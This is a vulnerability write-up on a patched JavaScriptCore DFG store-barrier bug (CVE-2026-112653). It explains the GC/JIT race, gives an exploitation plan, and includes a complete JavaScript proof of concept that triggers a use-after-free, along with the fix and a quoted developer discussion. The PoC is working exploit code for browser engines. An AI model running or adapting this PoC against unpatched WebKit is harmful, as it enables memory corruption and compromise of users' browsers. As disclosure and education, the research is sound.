---
title: "[ENG] The Frenemies, GC and JIT"
date: "2026-11-06"
tags:
  - Research
  - WebKit
  - JavaScriptCore
  - JIT
  - GC
  - CVE
  - English
  - Security
  - Web
language: en
author: m411k
thumbnail: "/images/thumbnail/the-frenemies-gc-and-jit.png"
copyright: |
  © 2026 HSPACE (References) Author: Rewrite Lab (m411k)
  This copyright applies to this document only.
---

# The PoC

<video controls muted playsinline preload="metadata">
  <source src="/img/articles/the-frenemies-gc-and-jit/poc-compressed.mp4" type="video/mp4">
  <a href="/img/articles/the-frenemies-gc-and-jit/poc-compressed.mp4">Download the PoC video</a>
</video>

# The Premise

In the following article, we’ll have a look at [CVE-2026-112653](https://support.apple.com/en-us/149527#:~:text=WebKit%20Bugzilla%3A%20323227-,CVE%2D2026%2D112653,-%3A%20Malik%20M.%20%28%40m411k_%29), a bug that enables getting read and write primitives in the WebKit WebContent process, I recommend reading some introductory material[^1] before diving in if you’re unsure of your prerequisites.

> 💡 **Author's note**
>
> This article was written with zero LLMs help, to keep it’s authentic wacky english human sense, the only help of LLMs was in actual exploitation discussed below.

## A Fortunate Fiasco

In May, I started with @oxqnd a research surrounding agentic fuzzing of Safari’s JS engine: [JavascriptCore](https://en.wikipedia.org/wiki/WebKit#JavaScriptCore), fast forward 6 months, we concluded the project as a failed experience, the debacle was mix of us moving in the not completely wrong but in a deviated direction that complicated things and rendered them impractical cost wise and engineering time wise, and of us moving on in terms of excitement from the general premise, but nonetheless, one of the fruits of this research is us getting to know very well the internals of JavascriptCore and the opportunity for example to find this bug that am about to uncover.

# The Setup

[DFG](https://docs.webkit.org/Deep%20Dive/JSC/JavaScriptCore.html#dfg) is a mid tier JSC compiler, that is it does a considerable amount of optimizations but keeps in mind the compilation time, this is the de facto design of modern Javascript compilers (e.g [Sparkplug](https://v8.dev/blog/sparkplug)/[Maglev](https://v8.dev/blog/maglev) for V8, [Baseline compiler](https://firefox-source-docs.mozilla.org/js/how-we-optimize.html#:~:text=Baseline%20compiler%3A%20this%20is%20a%20simple%20template%20JIT%20compiler.) for SpiderMonkey), and given it multitudes of optimizations it uses a [IR](https://en.wikipedia.org/wiki/Intermediate_representation) that makes it easier ultimately to implement said optimizations.

The IR is pretty straightforward and expressive, here is some nodes to get the gist:

- `ArithMul`: Multiplies two numbers (that’s integers and doubles).
- `PutByVal`: Think `obj["attr"] = val`
- `NewArray`: Think `let arr = [a, b, c]` (psss… `NewArrayBuffer` is for static compile time values e.g `= [1, 2, 3]` this node is gonna come into the story in a minute)

You get the idea[^2].

One these optimizations that gets applied to the IR graph, is the [barrier elimination phase](https://en.wikipedia.org/wiki/Write_barrier), or sorry, to be exact, [the store barrier insertion phase](https://github.com/WebKit/WebKit/blob/main/Source/JavaScriptCore/dfg/DFGStoreBarrierInsertionPhase.cpp)[^3], it’s just that it tries to do so conservatively, if a store doesn’t need a barrier, it will not be inserted, what is a case of that you say?

Say a store operation is applied to a newly allocated object and the value assigned is also new (also referred to as being in [newgen](https://github.com/WebKit/WebKit/blob/0c7a4142a6e9843c648cb5d13c0b7b2a40d1c1c3/Source/JavaScriptCore/dfg/DFGStoreBarrierInsertionPhase.cpp#L669)), then there is probably no need for a store barrier if we can prove that a black to white or new to old is impossible, that’s called concurrent or generational barriers respectively.

Otherwise if we’re unsure in the slightest that a GC is triggered between the creation of the object and the assignment, you better add that barrier.

So if an object is newly created the assignment doesn’t need a store barrier right? well… did you mean a newly or the *newest?* what’s the difference you say? well that’s the story’s punchline.

# The Punchline

When I was reading through the [phase code](https://github.com/WebKit/WebKit/blob/main/Source/JavaScriptCore/dfg/DFGStoreBarrierInsertionPhase.cpp), a comment really caught my attention:

```cpp
            switch (m_node->op()) {
            case NewObject:
            case NewArray:
            case NewArrayWithSize:
            case NewArrayWithButterfly:
            case NewButterflyWithSize:
            case NewArrayWithSizeAndStructure:
            case NewArrayBuffer:
            case NewInternalFieldObject:
            case NewPromise:
            case NewTypedArray:
            case NewTypedArrayBuffer:
            case NewRegExp:
            // ...
            case NewBoundFunction:
            case AllocatePropertyStorage:
            case ReallocatePropertyStorage:
                // Nodes that allocate get to set their epoch because for those nodes we know
                // that they will be the newest object in the heap.
                m_node->setEpoch(m_currentEpoch);
                break;

```

An invariant is explicitly stated here:

> The returned cell object needs to be the last and the latest allocated object (or that uses the same allocator for that matter) in the course of that node’s implementation.
>

In that case you can elide the store barrier by setting the node’s epoch to the “present moment”, and comes to play in the `considerBarrier` function:

```cpp
    void considerBarrier(Edge base)
    {
		    // ...
        // We don't need a store barrier if the epoch of the base is identical to the current
        // epoch. That means that we either just allocated the object and so it's guaranteed to
        // be in newgen, or we just ran a barrier on it so it's guaranteed to be remembered
        // already.
        if (base->epoch() == m_currentEpoch) {
            dataLogLnIf(DFGStoreBarrierInsertionPhaseInternal::verbose, "            Rejecting because it's in the current epoch.");
            return;
        }
        // ...
        insertBarrier(m_nodeIndex + 1, base);
    }
```

So do all these nodes follow my formulated invariant?

Let’s take a look at the `NewArrayBuffer` implementation:

```cpp
void SpeculativeJIT::compileNewArrayBuffer(Node* node)
{
		// ...
    if (!globalObject->isHavingABadTime() && !hasAnyArrayStorage(indexingMode)) {
				// ...

        addSlowPathGenerator(slowPathCall(slowCases, this, operationNewArrayBuffer, result.gpr(), TrustedImmPtr(&vm()), structure, LinkableConstant(*this, array))); // Focus on this <---

        DFG_ASSERT(m_graph, node, indexingMode & IsArray, indexingMode);
        cellResult(resultGPR, node);
        return;
    }
		// ...
    cellResult(result.gpr(), node);
}
```

To help you navigate JavascriptCore for further research each node is almost always prefixed with `compile` in where you can find it’s implementation.

So when the global object is having a bad time (that’s basically when any object in this realm's array prototype chain have (or may it gain) the ability to intercept indexed accesses e.g [runtime/JSObject.cpp:1249](https://github.com/WebKit/WebKit/blob/5eda8501c9c38260707f908d735ecda495bfb925/Source/JavaScriptCore/runtime/JSObject.cpp#L1249)), the slow path `operationNewArrayBuffer` is called to get the writable array, which in turn calls `allocateNewArrayBuffer`:

```cpp
JSC_DEFINE_JIT_OPERATION(operationNewArrayBuffer, JSCell*, (VM* vmPointer, Structure* arrayStructure, JSCell* immutableButterflyCell))
{
		// ...
    auto* result = CommonSlowPaths::allocateNewArrayBuffer(vm, arrayStructure, immutableButterfly);
    // ...
}
```

```cpp
inline JSArray* allocateNewArrayBuffer(VM& vm, Structure* structure, JSCellButterfly* immutableButterfly)
{
    // ...
    JSArray* result = JSArray::createWithButterfly(vm, nullptr, originalStructure, immutableButterfly->toButterfly());
    if (originalStructure != structure) [[unlikely]] {
        // ...
        result->switchToSlowPutArrayStorage(vm);
        // ...
    }

    return result;
}
```

now you will notice that up there ^ `result->switchToSlowPutArrayStorage(` is called after result is allocated, what will there be in `switchToSlowPutArrayStorage` implementation?

```cpp
void JSObject::switchToSlowPutArrayStorage(VM& vm)
{
    ensureWritable(vm); // what's in here?
    // ...

inline void JSObject::ensureWritable(VM& vm)
{
    if (isCopyOnWrite(indexingMode()))
        convertFromCopyOnWrite(vm); // hmmm...
}

void JSObject::convertFromCopyOnWrite(VM& vm)
{
		// ...
    Butterfly* newButterfly = Butterfly::createUninitialized(vm, this, 0, propertyCapacity, hasIndexingHeader, newVectorLength * sizeof(JSValue));
    // ^ boom!!!
    // ...
```

Now I don’t want to bore you with `createUninitialized` but you can sense that’s it’s an allocation:

```
└─ Butterfly::createUninitialized       (ButterflyInlines.h)
    └─ vm.auxiliarySpace().allocate(vm, size, nullptr, Assert)
        └─ LocalAllocator::allocateSlowCase (LocalAllocator.cpp)
            └─ heap.collectIfNecessaryOrDefer(nullptr)           // Heap.cpp
                └─ collectAsync() + stopIfNecessary()            // Heap.cpp
```

So what do we establish here? in the DFG graph, the `NewArrayBuffer` get’s the epoch of the present moment, afterwards if we meet a `PutByVal` the barrier is gonna be elided. for that to be sane there should be no GC safepoint (A point where GC may run) in between the two (that’s the array allocation and the edge assignment), and we just found a little creepy-crawly GC-undefered allocation in between, effectively rendering it effectively as post-`NewArrayBuffer` `doesGC` node[^4] (that should bump the epoch but doesn’t in our intricate case).

# The Tag

The path for triggering the bug was the trickiest, precisely a GC has to be triggered @ `operationNewArrayBuffer` so that the concurrent marker kicks off, and that concurrent soundness desyncs upon the lost barrier, the most important thing is that the victim must be white during the active concurrent drain of the intra-node cycle, here is a pseudo-plan of exploitation:

1. The allocation-triggered GC runs its stop-the-world conservative scan *synchronously
inside the node*, then hands draining to the concurrent marker and returns to the
mutator, still inside `operationNewArrayBuffer`. DFG code with no GC-point nodes
never safepoints, so `f` runs unimpeded while the marker drains.
2. `arr` (stack root in `operationNewArrayBuffer`'s frame) is appended at the scan and
drained black early.
3. The victim is reachable *only* through a *long* linked chain the marker has not walked yet
(`obj -> ... -> tail`, `tail.p = victim`).
4. The mutator (after a calibrated delay) walks the chain, reads `victim = tail.p`,
stores it barrier-free into `arr[0]`, and clears ****`tail.p` before the marker gets
there. The marker later drains `tail`, sees `p = null`, and never learns about
`victim`.
5. Cycle ends: `arr` live+marked, `victim` reachable only via the untracked `arr[0]`
edge -> unmarked -> swept, accessing the edge then constitutes a use after free.

here’s the pseudo-code of the aforementioned plan:

```
f(obj, seed):                        // DFG, straight-line, no loops
    let arr = [256 int constants];   // NewArrayBuffer (bad-time), intra-node GC window
    <unrolled xorshift ×K>           // calibrated delay: arr drained black by now
    <D unrolled `vi = v(i-1).a` hops>
    let victim = tail.p;
    arr[0] = victim;                 // <- the elided-barrier store
    tail.p = null;                   // drop the only other reference
    victim = null;  v_i = null ...     // self-clobber f's frame
    clobber(x, ...);  return arr;

driver loop:                         // interpreted, per iteration
    head = makeChain();              // fresh chain: victim at tail, DefinitelyWhite
    scrub();                         // zero makeChain's dead frame
    keepArr = f(head, seed+i);
    scrub();                         // zero f's dead DFG frame (spill slots)
```

An also interesting detail is that the chain is tick with asymmetric dummy objects, these will slow down the marker thread (depth of the $chain * width =$ number of objects to pop till we can get to the the tail), while the mutator can cut straight to the tail white object with (depth of the $chain * GetByOffsets$ number of nodes), this helps decouple the two threads progress.

Heap read/write primitives require some fengshui that are not very interesting or novel in particular[^5].

Here is the [minimalistic PoC](https://github.com/WebKit/WebKit/commit/8850e4d8f596c2618219901e8e5ece5e9a0727f0#diff-bad9a441b0852758aebd4200468b5d930acbe453465284b928799acff4f5c57e):

```jsx
// When the global object is having a bad time, operationNewArrayBuffer creates the JSArray cell and
// then allocates its ArrayStorage butterfly via switchToSlowPutArrayStorage. That second allocation
// must not let a GC run: a conservative stack scan would blacken the freshly created array, which
// breaks the invariant DFG's StoreBarrierInsertionPhase relies on when it elides the
// FencedStoreBarrier for stores into a cell allocated in the current epoch. The store below would
// then create an untracked black -> white edge and the victim would be swept while reachable.

// ... these iterations exist to accumulate GC-cycle race attempts, not only to reach a tier.
const D = 130, W = 55, K = 100, LIT = 4096, ITER = 1000;

function clobber(a, b, c, d, e, g, h, i) { return a ^ b ^ c ^ d ^ e ^ g ^ h ^ i; }
noInline(clobber);

var mkTail, mkLink;
{
    let props = [];
    for (let j = 0; j < W; ++j)
        props.push("b" + j + ": {}");
    mkTail = eval("(function (victim) { return { a: null, p: victim, " + props.join(", ") + " }; })");
    mkLink = eval("(function (next) { return { a: next, " + props.join(", ") + " }; })");
}

function makeChain() {
    let victim = {};
    let cur = mkTail(victim);
    for (let i = 0; i < D; ++i)
        cur = mkLink(cur);
    return cur;
}
noInline(makeChain);

// Zeroes out the dead frames of makeChain()/f() so that a stale spill slot doesn't keep the victim
// alive as a conservative root.
var scrub;
{
    let parts = [];
    for (let i = 0; i < 512; ++i)
        parts.push("a" + i + " = 0");
    scrub = eval("(function scrub() { let " + parts.join(", ") + "; return a0 + a511; })");
    noInline(scrub);
}

// A straight-line DFG function with no GC point after its NewArrayBuffer, so it never safepoints
// while the concurrent marker drains.
let source = "(obj, seed) => {\n";
source += "    let arr = [" + Array(LIT).fill(7).join(",") + "];\n";
source += "    let x = seed | 0;\n";
for (let i = 0; i < K; ++i)
    source += "    x = (x ^ (x << 13)); x = (x ^ (x >>> 17)); x = (x ^ (x << 5));\n";
let cur = "obj";
for (let i = 0; i < D; ++i) {
    source += "    let v" + i + " = " + cur + ".a;\n";
    cur = "v" + i;
}
source += "    let victim = " + cur + ".p;\n";
source += "    arr[0] = victim;\n";      // The store whose barrier was elided.
source += "    " + cur + ".p = null;\n"; // Drop the only other reference to the victim.
source += "    victim = null;\n";
for (let i = D - 1; i >= 0; --i)
    source += "    v" + i + " = null;\n";
source += "    clobber(x, x, x, x, x, x, x, x);\n";
source += "    return arr;\n";
source += "}";
const f = eval(source);

// Force a bad time so that NewArrayBuffer takes the slow-put-array-storage path.
Object.defineProperty(Array.prototype, 0, { get() { } });

let keepArr = null;
let seed = 0x2545F491;
for (let i = 0; i < ITER; ++i) {
    let head = makeChain();
    scrub();
    keepArr = f(head, seed + i);
    scrub();
}

if (keepArr.length !== LIT)
    throw new Error("bad length: " + keepArr.length);
```

You can find the heap read/write exploit here.

## The Patch

The patch is a one-liner:

```jsx
inline JSArray* allocateNewArrayBuffer(VM& vm, Structure* structure, JSCellButterfly* immutableButterfly)
{
    // ...

#ifndef RC_REMOVE_SEC_ACCEL_3
        // DFG StoreBarrierInsertionPhase requires that a node does not run any GC safepoints
        // after the node result is allocated (so that GC cannot yet see the result). So
        // skip GC across switchToSlowPutArrayStorage allocations. The ForAWhile means the
        // scope exit will not run the GC even if it was deferred during the scope.
        DeferGCForAWhile deferGC(vm);
#endif
        result->switchToSlowPutArrayStorage(vm);
        // ...
```

`DeferGCForAWhile` increments a counter that bumps the heap's deferral depth which basically turns every GC safepoint on the thread into a no-op that just remembers "GC work is pending" and, unlike plain `DeferGC`, its destructor does not flush that pending GC at scope exit. The deferral persists ("for a while") until whatever next safepoint runs outside the scope, which is the next allocating node, here is a direct eloquent quote from the [commit message body](https://github.com/WebKit/WebKit/commit/8850e4d8f596c2618219901e8e5ece5e9a0727f0#diff-a3375807326cbc145f004ffc7b935cae20ada2ce903f9250ac491c7c25edd593) that summarize it:

>
>
>
> So, to adhere to the requirements of DFGStoreBarrierInsertionPhase, use
> `DeferGCForAWhile` to skip these GC safepoints and importantly do not GC at
> scope exit, so the deferral holds until control returns to JIT
> code, where the next `doesGC()` node bumps the epoch and barriers resume.
>

Also as far as my modest analysis goes this bug was introduced by `c31e94657d09`, which added `allocateNewArrayBuffer` in exactly this shape; Epoch-based elision (2015) and concurrent GC (Dec 2016) predate it, and nothing since has closed the window: present for ~8 years, Safari 12
(Sept 2018)

[^1]: Suit yourself with the following resources:

    - [Browser Exploitation Primer](https://mwlik.github.io/2025-05-15-browser-exploitation-primer/) (Although it's around V8, but the principles are very interoperable)
    - [A Brief JavaScriptCore RCE Story](https://qriousec.github.io/post/jsc-uninit/)
    - [Pwning Chromium 146 Renderer Process](https://rewritelab.org/researchs/11/) (It goes into write barriers which are brought up here)

[^2]: If not, these might help:

    - [JavaScriptCore's DFG JIT (JSConf EU 2012)](https://www.youtube.com/watch?v=wylW3QWkrWc)
    - [A design overview of JavaScriptCores DFG IR](https://www.youtube.com/watch?v=EFRzBb9NYjM)
    - [JavaScriptCore, many compilers make this engine perform](https://www.youtube.com/watch?v=mtVBAcy7AKA)

[^3]: Worth mentioning that when I was learning about this particular phase, a conversation I had in the [Webkit slack](https://webkit.org/getting-started/) helped me a lot during my research, so am obliged to thank their insightful comments, here is the excerpt:

    > **Malik** (Aug 12, 6:05 PM):
    >
    >
    > Hey guys, I've been instructed by mark to pose my question here:
    > I've been poking at the DFG store barrier insertion phase and I keep getting stuck on the epoch invariant, specifically the rule that a node which can GC (doesGC) must bump the epoch.
    > My current thinking is that breaking that invariant is still harmless as long as the offending node doesn't return a new-gen object. Take this graph:
    >
    > ```
    > 2: NewObject (edge)
    > 3: NewObject (base)
    > 4: <node that doesGC, bumps the epoch, returns no JS value>
    > 5: PutByOffset(@3, 'x', @2)
    > 6: StoreBarrier(@3)
    > ```
    >
    > Node @4 bumps the epoch, so at the PutByOffset @3's epoch no longer equals the current epoch and a StoreBarrier gets inserted. What I can't work out is why that barrier is actually needed, and how the buggy case (the bump missed, barrier elided) could be exploited. I don't see how you build a black->white edge here. The base is created after the edge, both are NewObjects, and after the GC at node @4 both have survived a collection, so by the usual definition they're both old-gen. That makes @3.x = @2 an old->old store that doesn't want a barrier in the first place.
    > There are several nodes in this bucket, doesGC = true and returning no new-gen JS value (or nothing at all): CheckTierUpInLoop, CheckTraps, and so on. They all bump the epoch and therefore force a StoreBarrier on later stores, and I don't follow why that's required.
    > So really my question is: what am I missing? Why were these patches for example necessary (specifically the ones that don't return a NodeResultJS)?
    >
    > - SameValue: [commits.webkit.org/208679@main](http://commits.webkit.org/208679@main)
    > - a few more nodes (StringFromCharCode etc.): [commits.webkit.org/208756@main](http://commits.webkit.org/208756@main)
    > - CheckTraps / GetMapBucket / Switch: [commits.webkit.org/208827@main](http://commits.webkit.org/208827@main)
    > - CheckTierUp* / GetByVal / PutByVal* / StringCharAt: [commits.webkit.org/208873@main](http://commits.webkit.org/208873@main)
    > - CompareEq/Less/.../CompareStrictEq: [commits.webkit.org/209184@main](http://commits.webkit.org/209184@main)
    > - TryGetById / ProfileType: [commits.webkit.org/209197@main](http://commits.webkit.org/209197@main)
    >
    > Happy to clarify if any of the above is muddy. *(edited)*
    >
    > **Keith Miller** (Aug 12, 6:15 PM):
    >
    > I believe PossiblyBlack can mean, in a classical GC sense, White when doing a full GC (if the marked bit is not set). So for a full GC it needs the barrier
    >
    > **Malik** (Aug 12, 8:15 PM):
    >
    > Hmmmm, I don't really understand, can you emphasize? or can I have an example scenario so I can get how this answers it? whether it's an eden/full both base and edge (before it existed before base) will be old-gen, thus not needing a barrier cmiiw *(edited)*
    >
    > **Keith Miller** (Aug 12, 10:23 PM):
    >
    > I think your case may be sound to elide but only because the value dominates the base so any time the base is visible so is the value. A broken case, IIUC, from your proposal is something like:
    >
    > ```
    > @1: NewObject                    // base  — epoch 1, DefinitelyWhite
    > @2hacktest 2: CheckTraps                   // doesGC=true; if it wrongly returned false, no bump
    > @3: GetByOffset(@obj, 'p')       // doesGC=false, no bump; yields a DefinitelyWhite cell
    > @4: PutByOffset(@1, 'p', @3)     // @1->epoch()==1==current
    > @5: PutByOffset(@obj, 'p', null)
    > ```
    >
    > With the bug: a concurrent cycle starts at @2. @1 is a fresh root-reachable object with no outgoing edges, so it greys and drains to black immediately. @obj is greyed too, but the mark stack hasn't traced it yet, so 'p' is still white. @4 stores the still white 'p' into @1 and @5 clears 'p' from @obj so the GC never marks 'p'. *(edited)*
    >
    > **Malik** (Aug 12, 11:12 PM):
    >
    > Yes, this scenario seems more compelling, I'll study this aspect more and get back to you, thank you for your time! *(edited)*
    >
    > **Justin Michaud** (Aug 13, 3:24 AM):
    >
    > I'll leave a few thoughts/links for anyone else following along if you don't mind.
    >
    > 1. I think it is nice to separate concurrent and generational barriers in our minds, even though they are the same in JSC. If you are used to other engines / vms, maybe this is a bit different / rare.
    > [https://webkit.org/blog/7122/introducing-riptide-webkits-retreating-wavefront-concurrent-garbage-collector/](https://webkit.org/blog/7122/introducing-riptide-webkits-retreating-wavefront-concurrent-garbage-collector/)
    > This is the interesting part for this discussion:
    > Write barriers ensure that the state of the collector is still valid after any race, either by marking objects or by having objects revisited (GC Handbook, chapter 15). Marking objects helps the collector make forward progress; intuitively, it is like advancing the collector's wavefront. Having objects revisited retreats the wavefront. The literature of full of concurrent GC algorithms, like the Metronome, C4, and DLG, that all use some kind of advancing wavefront write barrier. The simplest such barrier is Dijkstra's, which marks objects anytime a reference to them is created. I used these kinds of barriers in my past work because they make it easy to make the collector very deterministic. Adding one of those barriers to WebKit would be likely to create some performance overhead since this means adding new code to every write to the heap. But the retreating wavefront barrier, originally invented by Guy Steele in 1975, works on exactly the same principle as our existing generational barrier. This allows Riptide to achieve zero barrier overhead by reusing WebKit's existing generational barrier.
    > 2. JSC is full of very conservative passes, so it is possible something will be inserted when it is not needed and it might be an optimization opportunity!
    > 3. In your example, you do not need a generational barrier because you have proven that generation(edge) >= generation(base) (although that might be hard to generalize), but you do still need a concurrent barrier as Keith pointed out. Note that you don't need the barrier immediately, as long as it happens before the next safe point.
    > 4. [https://dl.acm.org/doi/epdf/10.1145/301589.286863](https://dl.acm.org/doi/epdf/10.1145/301589.286863) was a super fun paper if you are at all curious about the design space
    >
    > **saamyjoon** (Aug 14, 1:09 AM):
    >
    > Node @4 may terminate a GC. Read "DoesGC" to mean "GC may terminate now". So if the GC does terminate, we're now looking at the program execution after that. So let's say all this happens in @4 :
    >
    > ```
    > GC cycle N terminates
    > GC cycle N+1 starts
    > GC cycle N+1 somehow marks and traverses @3. So @3 is now black.
    > You store @2 ,which is white, into @3, which is black.
    > Sadness ensues if no write barrier
    > ```
    >
    > *(edited)*
    >
    > **saamyjoon** (Aug 14, 1:11 AM):
    >
    > If you prove that both @2 and @3 haven't escaped to the heap, then you could probably omit the barrier. But that's a lot more than what the current analysis is doing (as of 4 years ago, I haven't read the code more recently).
    >
    > **saamyjoon** (Aug 14, 1:12 AM):
    >
    > But if @4 was something like Call(..., @3, ...), then that would be "an escape". Or even if @3 was stored into the heap somewhere before @4. *(edited)*
    >

[^4]: A type of bug that isn’t terribly alien to the JSC codebase:

    - [https://commits.webkit.org/208679@main,](https://commits.webkit.org/208679@main) [https://commits.webkit.org/208756@main,](https://commits.webkit.org/208756@main) [https://commits.webkit.org/208827@main,](https://commits.webkit.org/208827@main) [https://commits.webkit.org/208873@main,](https://commits.webkit.org/208873@main) [https://commits.webkit.org/209184@main (CVE-2019-8559),](https://commits.webkit.org/209184@main) [https://commits.webkit.org/209197@main](https://commits.webkit.org/209197@main)

[^5]: Also because and am not saying it proudly the r/w primitives we’re absolutely slopped by me, so if you want an educated resource to look at how they can be achieved, check these:

    - [Attacking JavaScript Engines: A case study of JavaScriptCore and CVE-2016-4622](https://phrack.org/issues/70/attacking-javascript-engines-a-case-study-of-javascriptcore-and-cve-2016-4622#article)
    - [Shifting boundaries: Exploiting an Integer Overflow in Apple Safari](https://blog.exodusintel.com/2023/07/20/shifting-boundaries-exploiting-an-integer-overflow-in-apple-safari/)
    - [Oops Safari, I think You Spilled Something!](https://blog.exodusintel.com/2025/08/04/oops-safari-i-think-you-spilled-something/)
